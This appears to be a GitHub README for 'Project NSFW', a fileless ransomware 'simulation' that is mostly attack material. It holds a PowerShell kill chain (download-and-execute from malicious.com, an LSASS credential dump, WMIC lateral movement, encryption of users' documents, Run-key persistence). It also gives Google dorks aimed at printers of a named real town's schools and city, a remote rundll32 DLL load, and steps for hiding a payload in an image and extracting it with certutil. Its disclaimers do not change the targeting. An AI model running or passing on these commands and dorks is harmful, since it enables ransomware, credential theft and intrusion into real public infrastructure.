
# 🚩 Overview

![Demo Screenshot](https://github.com/user-attachments/assets/f93a65bd-d000-41f0-a941-631f047417e4)

---

## 🔒 Project NSFW: Net Sharing Fileless Wiperware

### Executive Summary

**Project NSFW** is a red/purple team research initiative that simulates a **fileless malware** framework, purpose-built for **Windows 11** environments. This project is for educational and security research purposes only.

---

This repository enables simulation of a realistic adversary kill chain using MITRE ATT&CK techniques, emphasizing complete fileless operation and stealth.

---

## 🔓 Fileless Ransomware Lab Example (LOLBins in Action)

> **Warning:** This is a synthetic simulation for red team research.  
> **Never run outside of an isolated test lab.**

```powershell
# Initial Access (T1190) - Load dropper via web
IEX(New-Object Net.WebClient).DownloadString("http://malicious.com/dropper.ps1")

# Execution (T1059.001) - Decode & load payload
$bytes = [System.Convert]::FromBase64String("[Base64Payload]") 
[System.Reflection.Assembly]::Load($bytes)

# Privilege Escalation (T1548)
Start-Process powershell -Args "-ExecutionPolicy Bypass -File C:\Temp\elevate.ps1" -Verb RunAs

# Credential Access (T1003.001)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full

# Lateral Movement (T1021.001)
wmic /node:targetPC process call create "powershell.exe -File \\share\payload.ps1"

# File Encryption (T1486)
$files = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.docx,*.pdf -Recurse
foreach ($file in $files) {
  $data = Get-Content $file.FullName -Raw
  $aes = New-Object System.Security.Cryptography.AesManaged
  $aes.Key = [Text.Encoding]::UTF8.GetBytes("RANDOM-GEN-KEY-1234567890123456")
  $aes.IV = New-Object byte[] 16
  $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
  Set-Content -Path $file.FullName -Value ([Convert]::ToBase64String($enc))
}

# Persistence (T1547.001)
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ransomware" -Value "powershell -File C:\Temp\persist.ps1"
```
## Google Dorks Recon:

# 🖨️ Printer Reconnaissance via Google Dorking  
**Target Location:** Moberly, Missouri  
**Objective:** Identify publicly exposed printer services vulnerable to Windows Print Spooler exploits such as CVE-2021-1675 (PrintNightmare), CVE-2021-34527, and CVE-2022-21999. These exposures can assist in red team assessments, lateral movement staging, or vulnerability management audits.

This technique uses crafted Google Dork queries to uncover unsecured or misconfigured web-based printer interfaces (e.g., HP JetDirect, RICOH Web Image Monitor, Canon UI), often found in public school systems, city infrastructure, or small business networks. These systems may have active Print Spooler services, which can be exploited for privilege escalation or remote code execution via known vulnerabilities.

---

## 🔍 Google Dork Examples (Moberly-Focused)


    inurl:"/hp/device/this.LCDispatcher" "Moberly"
    intitle:"Printer Status" "Moberly Public Schools"
    intitle:"Web Image Monitor" inurl:"/wim" "Moberly"
    inurl:"/printer/main.html" "City of Moberly"
    intitle:"Web Jetadmin" "Moberly"
    inurl:"/printers/" "Moberly"
    inurl:"/PPS/public/" "Moberly"
    intitle:"Konica Minolta" inurl:"/wcd/" "Moberly"
    intitle:"PaperCut MF" "Moberly"
    intitle:"Lexmark" inurl:"/printer/" "Moberly"
    intitle:"Canon Remote UI" "Moberly"
    intitle:"EpsonNet Config" "Moberly"

---
## LOLbins Overveiw: 

# 🛠️ LOLBINS Reconnaissance Summary  
**Target Context:** Moberly, Missouri  
**Objective:** Understand and utilize **LOLBins** (Living Off the Land Binaries) as part of stealthy, fileless post-exploitation strategies targeting public infrastructure—such as printers, school networks, or municipal systems—in regions like **Moberly, MO**.

LOLBins are legitimate Windows binaries that come pre-installed and are often trusted by endpoint security tools. Adversaries and red teamers abuse these tools to execute malicious payloads without dropping new files, reducing detection risk. Their misuse is a cornerstone of fileless malware operations and is commonly observed in advanced persistent threat (APT) campaigns.

---

## 📌 Example Use Case – Moberly Print Service Target


    rundll32.exe \\10.10.X.X\shared\payload.dll,ReflectEntry


**Scenario:**
After identifying an exposed printer or print server in Moberly (e.g., via Google Dorking), the attacker uses **`rundll32.exe`**—a trusted binary—to execute a DLL payload from a shared network path. This avoids writing to disk and exploits the Print Spooler service remotely if vulnerable (e.g., CVE-2021-1675).

---

**Note:** LOLBins like `rundll32.exe`, `regsvr32.exe`, and `powershell.exe` should be monitored in high-trust environments like public school or city IT networks, especially when they interact with remote shares or untrusted memory regions.


## Embed and Encoded Dropper:


# Embed & Encode Dropper into Image (Fileless Staging)  
**Context:** Covert delivery of payloads in environments like Moberly, MO public networks using **Windows-native tools** to avoid detection and bypass basic file filtering.

This technique involves embedding a malicious `.7z` archive (containing a DLL or shellcode) inside an image file (e.g., `nsfw.jpg`) and then extracting it on the target system using **LOLBins** like `certutil.exe` and `copy.exe`. This is commonly used in phishing, local access staging, or in lateral movement operations across printer or SMB shares.

---

## 🔐 Dropper Embed Example

1. **Create Combined Payload Locally**
```bash
copy /b nsfw.jpg + payload.7z nsfw.jpg
````

> Appends the `.7z` archive to the end of `nsfw.jpg` without altering image viewability.

2. **Transfer to Target (e.g., exposed printer share or web panel)**

---

## 📤 Decode & Extract on Target Using LOLBins

```cmd
certutil -decode nsfw.jpg dropper.7z
```

> Extracts the embedded `.7z` file from the image.

```cmd
7z x dropper.7z -oC:\Users\Public\
```

> (If 7-Zip is available or dropped via another LOLBin.)

---

## 🎯 Use Case in Moberly Print Scenario

After identifying an exposed printer web interface or open SMB share via Google Dorking in **Moberly, Missouri**, a red teamer can drop `nsfw.jpg` to a public share or printer-accessible directory. A scheduled task, PowerShell execution, or manual `certutil` decoding on the target completes the payload delivery **without touching disk with a .exe** directly.

---

**Note:** This method bypasses traditional filters (e.g., `.exe` blocks) and leverages built-in binaries, making it highly evasive in legacy or lightly monitored environments.

```
```


## HiveNightmare / Print Spooler Exploits: 

## Reflective Dll Injection: 

## Mitre Attack Summary: 

## Detection & Mitigation Strategy

---

### ⚠️ Legal Disclaimer

All code, content, and techniques provided in this project are strictly for **educational** and **authorized penetration testing** purposes only. Usage must be confined to **isolated lab environments** and must comply with all relevant laws and regulations.

---

## 🧭 Additional Resources

* [LOLOL Farm – LOLBin Playground](https://lolol.farm/)
* [LOLGEN – Generate LOLBin Chains](https://lolgen.hdks.org/)
* [MITRE ATT&CK: S0697](https://attack.mitre.org/software/S0697/)
* [DLL Injection Primer](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
* [Print Spooler Exploit Chain](https://itm4n.github.io/printnightmare-not-over/)
* [Fileless Malware – Wikipedia](https://en.wikipedia.org/wiki/Fileless_malware)

---

### 📚 Print Spooler CVEs

* [SysNightmare](https://github.com/GossiTheDog/SystemNightmare)
* [PrintSpoofer (Original)](https://github.com/itm4n/PrintSpoofer/tree/master)
* [PrintSpoofer 2](https://github.com/dievus/printspoofer)
* [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare)

